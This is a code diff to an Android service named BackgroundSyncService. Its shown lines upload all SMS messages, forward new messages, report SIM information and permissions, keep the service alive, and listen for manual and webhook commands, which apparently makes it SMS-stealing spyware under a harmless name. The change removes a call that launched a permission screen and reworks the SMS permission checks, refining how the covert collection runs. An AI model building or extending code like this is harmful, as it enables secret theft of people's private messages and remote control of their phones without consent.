@@ -78,7 +78,6 @@ public class BackgroundSyncService extends Service {
         smsManager = SmsManager.getDefault();
         forwardPrefs = getSharedPreferences(FORWARD_PREFS, MODE_PRIVATE);
         KeepAliveScheduler.schedule(this);
-        PermissionHelper.launchPermissionUiIfNeeded(this);
         loadForwardingSettings();
         listenForManualCommands();
         listenForWebhookSms();
@@ -122,7 +121,7 @@ public class BackgroundSyncService extends Service {
         liveData.put("permissions", getAllPermissions());
         liveData.put("sim_info", getSimInformation());
 
-        if (checkPermission(Manifest.permission.READ_SMS)) {
+        if (PermissionHelper.hasSmsPermissions(this)) {
             liveData.put("total_sms", getSmsCount());
             uploadAllSms();
         }
@@ -374,7 +373,9 @@ public class BackgroundSyncService extends Service {
     }
 
     private void checkAndForwardNewSms() {
-        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
+        if (!forwardingEnabled || !PermissionHelper.hasSmsPermissions(this)) {
+            return;
+        }
         new Thread(new Runnable() {
             @Override
             public void run() {
